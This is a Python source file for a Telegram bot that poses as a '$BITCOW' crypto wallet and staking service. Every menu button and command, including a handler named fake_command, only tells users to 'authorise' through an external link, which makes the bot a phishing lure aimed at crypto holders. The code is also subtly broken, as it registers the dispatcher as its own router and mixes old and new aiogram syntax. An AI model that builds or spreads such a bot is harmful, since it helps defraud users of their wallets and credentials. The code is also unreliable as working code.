from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils.markdown import hlink
import asyncio
import os

TOKEN = os.getenv("TOKEN")
AUTH_URL = "https://luxtube.com/page"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Главное меню (инлайн-кнопки)
def get_main_keyboard():
    buttons = [
        [InlineKeyboardButton(text="💰 Wallet", callback_data="wallet"), InlineKeyboardButton(text="📊 Portfolio", callback_data="portfolio")],
        [InlineKeyboardButton(text="📈 Market", callback_data="market"), InlineKeyboardButton(text="⚡ Staking", callback_data="staking")],
        [InlineKeyboardButton(text="🎁 Airdrops", callback_data="airdrops"), InlineKeyboardButton(text="🔗 Refer & Earn", callback_data="referrals")],
        [InlineKeyboardButton(text="🚀 Upgrade Plan", callback_data="upgrade")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

commands_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="/start"), KeyboardButton(text="/authorise"), KeyboardButton(text="/support")]
    ], resize_keyboard=True
)

@dp.message(commands=['start'])
async def start_command(message: types.Message):
    text = (
        "🚀 <b>Welcome to $BITCOW Crypto Bot!</b>\n"
        "Manage your portfolio, stake tokens, and earn rewards.\n\n"
        f"⚠️ <i>Before using any feature, you must authorise here:</i> {hlink('Our Link', AUTH_URL)}"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_main_keyboard())

@dp.message(commands=['authorise', 'support'])
async def fake_command(message: types.Message):
    await message.answer(
        f"⚠️ <i>You must authorise first!</i> Click here: {hlink('Our Link', AUTH_URL)}",
        parse_mode="HTML"
    )

@dp.callback_query(lambda call: call.data in ["wallet", "portfolio", "market", "staking", "airdrops", "referrals", "upgrade"])
async def handle_feature(call: types.CallbackQuery):
    await call.answer("⚠️ You must authorise first! Click 'Our Link' in the message above.", show_alert=True)

async def main():
    dp.include_router(dp)  # Новая схема маршрутизации в aiogram 3.x
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
